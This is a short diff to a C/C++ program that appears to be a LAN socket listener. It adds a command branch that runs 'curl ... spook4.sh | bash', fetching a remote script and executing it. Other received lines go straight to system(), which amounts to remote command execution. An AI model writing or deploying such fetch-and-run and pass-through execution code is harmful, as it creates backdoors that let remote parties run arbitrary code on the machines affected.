@@ -128,6 +128,9 @@ int main(int argc, char * argv[]) {
             else if(ligne=="spook3_single\r"){
                 retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook3_single.sh | bash");
             }
+            else if(ligne=="spook4\r"){
+                retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook4.sh | bash");
+            }
             else {
                 retour = system(ligne2);
             }
